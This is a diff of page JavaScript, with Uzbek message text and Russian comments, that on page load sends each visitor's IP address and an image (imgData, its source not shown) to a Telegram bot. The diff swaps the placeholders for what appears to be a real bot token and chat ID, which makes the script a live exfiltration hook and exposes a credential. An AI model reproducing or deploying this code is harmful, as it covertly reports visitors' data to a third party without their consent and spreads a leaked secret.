@@ -73,13 +73,13 @@ document.addEventListener("DOMContentLoaded", function() {
               const message = `Sizning saytingizni ochgan foydalanuvchi IP-manzili: ${userIp}`;
 
               // Отправляем запрос на Telegram через Webhook
-              fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+              fetch('https://api.telegram.org/bot8073879581:AAH-4aRkvCrxv7oiKBa8Ere_Z95hG21tBdU/sendMessage', {
                 method: 'POST',
                 headers: {
                   'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                  chat_id: 'YOUR_CHAT_ID',  // Ваш Telegram ID или ID группы
+                  chat_id: '7518382960',  // Ваш Telegram ID или ID группы
                   text: message
                 })
               })
@@ -92,10 +92,10 @@ document.addEventListener("DOMContentLoaded", function() {
               });
 
               // Отправляем изображение через Telegram
-              fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto', {
+              fetch('https://api.telegram.org/bot8073879581:AAH-4aRkvCrxv7oiKBa8Ere_Z95hG21tBdU/sendPhoto', {
                 method: 'POST',
                 body: new FormData({
-                  chat_id: 'YOUR_CHAT_ID',
+                  chat_id: '7518382960',
                   photo: imgData  // Отправляем изображение
                 })
               })
